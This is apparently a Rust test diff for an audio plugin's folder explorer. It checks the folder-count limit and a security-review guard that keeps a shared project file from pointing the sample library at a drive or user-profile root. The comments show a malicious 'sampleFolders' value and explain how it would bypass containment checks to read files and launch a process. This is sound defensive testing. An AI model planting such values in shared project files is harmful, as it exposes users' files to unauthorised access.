+    fn a_project_saved_with_more_folders_than_the_tab_strip_keeps_all_of_them() {
+        // Twelve, which was legal before the strip and is more than `MAX_ROOTS`.
+        let saved: Vec<String> = (0..12).map(|i| format!("/audio/library-{i}")).collect();
+        let explorer = Explorer::default();
+        explorer.restore(&saved);
+
+        assert_eq!(
+            explorer.snapshot(),
+            saved,
+            "a bound on what may be ADDED is not a licence to delete what is there"
+        );
+    }
+
+    /// ⛔ **The ninth folder is refused with the rule, not silently dropped.**
+    ///
+    /// Mike, 2026-08-10: *"if you want to add more, then you have to exit out of
+    /// one of them."* The page disables **Add folder** at eight; this is the same
+    /// rule where it is actually enforced, so a page that got it wrong cannot
+    /// exceed the bound.
+    #[test]
+    fn a_ninth_folder_is_refused_before_the_dialog_opens() {
+        let full: Vec<String> = (0..MAX_ROOTS).map(|i| format!("/root/{i}")).collect();
+        let explorer = Explorer::default();
+        explorer.restore(&full);
+
+        let error = explorer.pick().expect_err("a ninth folder must be refused");
+        assert!(error.contains("close one"), "{error}");
+        // ⚠ And no dialog was opened, so the page is not left polling `picking`
+        // for something that will never finish.
+        assert!(!explorer.state().picking, "no dialog should have started");
     }
 
     #[test]
@@ -917,9 +1600,61 @@ mod tests {
     #[test]
     fn the_saved_roots_round_trip() {
         let explorer = Explorer::default();
-        let saved = vec!["/one".to_owned(), "/two".to_owned()];
+        // ⚠ Two components deep, which is what a real library folder is — see
+        // `is_plausible_library`.
+        let saved = vec!["/audio/one".to_owned(), "/audio/two".to_owned()];
         explorer.restore(&saved);
         assert_eq!(explorer.snapshot(), saved, "order is the producer's");
+    }
+
+    /// ⛔⛔ **A project file must not be able to point the library at a whole
+    /// drive or a user profile.**
+    ///
+    /// Found by a security review, 2026-08-10. `sample_folders` rides the
+    /// `#[persist]` blob, so a shared `.als` or type-beat starter can carry
+    /// `"sampleFolders": ["C:\\Users"]` — a local path `refuse_remote` passes.
+    /// Because `contains` is a prefix test, installing it satisfies **every**
+    /// containment check in the plugin for that whole tree: the page could
+    /// enumerate it, read `.mid` content back, decode any audio in it, and
+    /// star-then-reveal any file — the one command that launches a process.
+    /// ⚠ **Posix spellings, and the Windows ones are a separate test below.** A
+    /// backslash is an ordinary filename character on Linux and macOS, so
+    /// `C:\Users\mike\Samples` is **one** component there — `refuse_remote`'s own
+    /// header records the same trap ("a project file is portable and `Path` is
+    /// not"). CI caught this on two runners.
+    #[test]
+    fn a_project_file_cannot_point_the_library_at_a_drive_or_a_profile() {
+        let explorer = Explorer::default();
+        explorer.restore(&[
+            "/".to_owned(),
+            "/home".to_owned(),
+            // ...and something that genuinely is a library, to prove the guard
+            // is a filter rather than a refusal of everything.
+            "/home/mike/Samples".to_owned(),
+        ]);
+
+        assert_eq!(
+            explorer.snapshot(),
+            vec!["/home/mike/Samples".to_owned()],
+            "only a folder deep enough to be somebody's library survives"
+        );
+    }
+
+    /// The same rule on the platform whose paths this actually protects.
+    #[test]
+    #[cfg(windows)]
+    fn a_windows_drive_or_profile_root_is_refused_too() {
+        let explorer = Explorer::default();
+        explorer.restore(&[
+            "C:\\".to_owned(),
+            "C:\\Users".to_owned(),
+            "C:\\Users\\mike\\Samples".to_owned(),
+        ]);
+
+        assert_eq!(
+            explorer.snapshot(),
+            vec!["C:\\Users\\mike\\Samples".to_owned()],
+        );
     }
 
     #[test]
